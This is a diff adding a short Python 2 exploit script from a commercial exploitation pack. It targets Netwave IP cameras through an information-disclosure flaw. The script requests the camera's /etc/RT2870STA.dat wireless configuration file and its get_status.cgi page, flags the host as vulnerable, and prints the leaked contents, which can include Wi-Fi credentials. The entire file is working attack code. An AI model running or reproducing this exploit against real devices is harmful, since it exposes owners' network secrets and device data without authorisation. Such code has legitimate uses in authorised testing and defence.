@@ -1,0 +1,46 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2017
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_netwave_1'
+_vendor_ = 'netwave'
+_model_  = ['Netwave IP Camera']
+_vuln_   = 'Information Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.exploit-db.com/exploits/41236/'
+_port_   = 80
+
+def pwnrouter(host):
+  urls = [
+    '/etc/RT2870STA.dat',
+    'get_status.cgi'
+  ]
+  
+  for u in urls:
+    try:
+      url = "http://%s/%s" % (host, u)
+      print '[+] url : %s' % url
+      response = requests.get(url)
+    except Exception, e:
+      print '[-] error : %s' % e
+      return
+    if (response is None) or ('404 Not Found' in response.text):
+      print '[+] %s not vulnerable' % host
+    else:
+      print '[+] %s vulnerable' % host
+      print response.text
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
